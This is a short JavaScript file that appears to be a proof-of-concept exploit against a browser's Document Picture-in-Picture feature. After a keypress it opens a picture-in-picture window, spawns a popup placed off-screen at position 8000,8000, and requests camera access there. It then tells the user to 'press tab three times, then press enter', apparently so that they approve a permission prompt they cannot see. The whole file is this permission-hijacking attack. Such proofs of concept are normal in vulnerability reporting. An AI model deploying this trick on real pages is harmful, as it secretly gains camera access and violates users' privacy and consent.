var ran = false;
var newWin;
var newWin2;
window.addEventListener('keydown', async () => {
  if (ran) {
    return;
  }

  ran = true;
  newWin = await documentPictureInPicture.requestWindow({
    width: 300,
    height: 400
  });
  newWin.addEventListener('keydown', () => {
    newWin2 = newWin.window.open('about:blank', 'aoPipPermission', 'width=500,height=300,top=8000,left=8000');
    newWin2.navigator.mediaDevices.getUserMedia({
      video: true
    });
    newWin.document.body.innerHTML = '<style>html { font-family: sans-serif; }</style><h1>Press tab three times, then press enter</h1>';
  });
});